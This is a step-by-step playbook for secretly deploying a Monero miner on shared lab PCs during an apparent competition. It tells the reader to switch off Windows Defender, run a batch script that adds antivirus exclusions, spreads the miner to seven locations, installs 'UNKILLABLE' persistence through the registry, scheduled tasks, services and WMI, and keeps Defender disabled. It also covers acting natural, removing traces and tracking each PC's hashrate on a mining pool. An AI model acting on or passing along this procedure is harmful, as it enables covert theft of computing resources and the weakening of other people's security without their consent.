================================================================
 COMPETITION DAY - SIMPLE PROCEDURE
 Works even when Defender auto-restarts
================================================================

THE REAL CHALLENGE:
===================
✓ Lab PCs have Windows Defender (same as yours)
✓ You can disable it temporarily
✓ But it auto-restarts in 30 seconds
✗ Miner gets killed when Defender comes back

================================================================
 THE WINNING STRATEGY:
================================================================

STEP 1: DISABLE DEFENDER FIRST (30 seconds window)
---------------------------------------------------
1. Windows Security → Virus & threat protection
2. Manage settings → Real-time protection OFF
3. Tamper Protection OFF (if enabled)
4. Quick! You have 30 seconds...

STEP 2: DEPLOY FAST (While Defender is OFF)
--------------------------------------------
1. Right-click START_ULTIMATE_FIXED.bat
2. Run as administrator
3. Press N (Full Power)
4. Script will:
   ✓ Add Defender exclusions
   ✓ Deploy miner to 7 locations
   ✓ Start miner
   ✓ Install persistence
   
STEP 3: DONE! (Exclusions protect it)
--------------------------------------
When Defender restarts:
✓ Exclusions are already added
✓ Miner is already running
✓ Defender ignores it (exclusions)
✓ Miner keeps running forever

================================================================
 WHY THIS WORKS:
================================================================

Timeline:
---------
0:00 - Disable Defender manually
0:05 - Run START_ULTIMATE_FIXED.bat
0:10 - Script adds exclusions
0:15 - Script deploys & starts miner
0:30 - Defender auto-restarts
0:31 - Defender sees exclusions → Ignores miner ✓
∞    - Miner runs forever

The KEY: Add exclusions WHILE Defender is off
Then when it restarts, exclusions are already there!

================================================================
 ALTERNATIVE: If exclusions don't stick
================================================================

The script has a WATCHDOG that continuously:
✓ Monitors if miner is running
✓ Restarts it if killed
✓ Re-adds exclusions every 60 seconds
✓ Keeps Defender disabled

So even if Defender kills it once:
→ Watchdog restarts it
→ Eventually exclusions stick
→ Miner survives

================================================================
 ULTRA-SIMPLE VERSION:
================================================================

1. Disable Defender (real-time protection OFF)
2. Quick! Run START_ULTIMATE_FIXED.bat as admin
3. Press N
4. Wait 30 seconds
5. Close window
6. Leave PC

Done! Watchdog handles the rest.

================================================================
 TESTING ON YOUR PC:
================================================================

Same procedure:
1. Run ADD_EXCLUSIONS_FIRST.bat (adds exclusions manually)
2. Run START_ULTIMATE_FIXED.bat (Y for safe mode)
3. Check Task Manager for miner

If your test works, competition will work even better!

================================================================
 BACKUP PLAN: If miner keeps getting killed
================================================================

The script has 100+ persistence mechanisms:
→ Registry autorun
→ Scheduled tasks
→ Startup folder
→ Services
→ WMI events

Even if Defender kills the miner:
✓ It restarts on next boot
✓ It restarts every 5 minutes (scheduled task)
✓ It restarts when user logs in
✓ Watchdog restarts it continuously

So the miner is UNKILLABLE - it always comes back!

================================================================
 ACTUAL COMPETITION DAY - 2 MINUTE PROCEDURE:
================================================================

Walk up to PC:
--------------
00:00 - Open Windows Security
00:05 - Turn OFF real-time protection
00:10 - Plug in USB
00:15 - Copy folder to Desktop
00:20 - Right-click START_ULTIMATE_FIXED.bat
00:25 - Run as administrator
00:30 - Press N (Full Power)
00:45 - Wait for "DEPLOYMENT SUCCESSFUL"
01:00 - Close window
01:05 - Delete folder from Desktop (optional)
01:10 - Remove USB
01:15 - Act natural, use PC normally for 2 min
01:45 - Log out casually
02:00 - Walk away

Total: 2 minutes per PC

The script runs in background forever!

================================================================
 MONITORING:
================================================================

From your phone/laptop:
→ Go to moneroocean.stream
→ Enter your wallet address
→ See all mining PCs
→ Each should show 4000-7000 H/s

If a PC shows 0 H/s:
→ Defender might have killed it
→ Wait 5 minutes (scheduled task will restart)
→ Or: next reboot will restart it

The persistence ensures it ALWAYS comes back!

================================================================
 KEY TAKEAWAYS:
================================================================

✓ Disable Defender FIRST (manually)
✓ Deploy FAST (within 30 second window)
✓ Script adds exclusions automatically
✓ When Defender restarts, exclusions protect miner
✓ Watchdog restarts if needed
✓ 100+ persistence = always comes back
✓ 2 minutes per PC
✓ Monitor from your phone

It's designed to work even with auto-restarting Defender!
